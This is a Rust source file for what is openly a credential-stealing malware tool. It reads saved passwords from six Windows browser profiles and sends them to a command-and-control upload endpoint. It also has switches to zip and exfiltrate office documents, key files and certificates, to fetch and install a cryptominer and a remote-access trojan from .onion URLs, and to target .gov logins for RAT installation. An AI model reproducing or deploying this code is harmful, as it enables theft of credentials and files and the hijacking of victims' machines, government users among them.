extern crate serde_json;

mod special;
mod files;
mod miner;
mod dpapi;
mod conn;
mod sqdb;
mod rat;

mod browsers {
    pub mod password;
    pub mod browser;
}

#[derive(Serialize)]
pub struct Log {
    pub browser: String,
    pub url: String,
    pub user: String,
    pub password: String
}

use browsers::browser::get_browser;
use files::exfiltrate_files;
use special::domains_punch;
use miner::install_miner;
use std::path::PathBuf;
use serde::Serialize;
use conn::send;
use std::env;

enum Browser {
    Brave,
    Chrome,
    Edge,
    Firefox,
    Opera,
    Vivaldi
}

fn sys_username() -> String {
    match env::var_os("USERNAME") {
        Some(username) => username.to_string_lossy().to_string(),
        None => String::new()
    }
}

fn process_browser(browser: Browser, path: &str, logs: &mut Vec<Log>) {
    let browser_path = PathBuf::from(path);
    let result = match browser {
        Browser::Brave => get_browser(browser_path, "brave"),
        Browser::Chrome => get_browser(browser_path, "chrome"),
        Browser::Edge => get_browser(browser_path, "edge"),
        Browser::Firefox => get_browser(browser_path, "firefox"),
        Browser::Opera => get_browser(browser_path, "opera"),
        Browser::Vivaldi => get_browser(browser_path, "vivaldi"),
    };
    if let Ok(data) = result {
        for log in data {
            logs.push(Log {
                browser: log.browser,
                url: log.url,
                user: log.user,
                password: log.password,
            });
        }
    }
}

fn main() {
    let mut logs: Vec<Log> = Vec::new();
    let username: String = sys_username();

    if username.is_empty() {
        return
    }

    let browsers_paths = [
        format!("C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
        format!("C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data"),
        format!("C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data"),
        format!("C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
        format!("C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable"),
        format!("C:\\Users\\{username}\\AppData\\Local\\Vivaldi\\User Data")
    ];
    let domains = vec![".gov".to_string()];
    let files_to_extract = vec![
        ".xls".to_string(), 
        ".xlsx".to_string(), 
        ".pdf".to_string(), 
        ".csv".to_string(),
        ".sql".to_string(),
        ".doc".to_string(),
        ".docx".to_string(),
        ".kbdx".to_string(),
        ".p12".to_string(),
        ".pfx".to_string(),
        ".key".to_string()
    ];
    let extract_files: bool = false;
    let max_file_size: u64 = 52428800;
    let install_rat_on_special_domains: bool = false;
    let miner_default: bool = false;
    let miner_url = String::from("https://rat.onion/miner.exe");
    let special_domains: bool = false;
    let rat_url = String::from("https://rat.onion/rat.exe");
    let zip_path = format!("C:\\Users\\{username}\\AppData\\Local\\Temp");
    let url_c2 = String::from("http://localhost:3000/api/upload");
    let public_key = String::from("");

    for (i, path_str) in browsers_paths.iter().enumerate() {
        match i {
            0 => process_browser(Browser::Brave, path_str, &mut logs),
            1 => process_browser(Browser::Chrome, path_str, &mut logs),
            2 => process_browser(Browser::Edge, path_str, &mut logs),
            3 => process_browser(Browser::Firefox, path_str, &mut logs),
            4 => process_browser(Browser::Opera, path_str, &mut logs),
            5 => process_browser(Browser::Vivaldi, path_str, &mut logs),
            _ => {}
        }
    }

    if logs.is_empty() {
        println!("No logs found!");
        return
    }

    println!("[+] Collected {} logs", logs.len());

    send(&logs, url_c2, public_key);
    
    if extract_files {
        exfiltrate_files(files_to_extract, max_file_size, zip_path);    
    }

    if special_domains {
        domains_punch(domains, logs, rat_url, install_rat_on_special_domains);
    } else {
        if miner_default {
            install_miner(miner_url);
        }
    }
}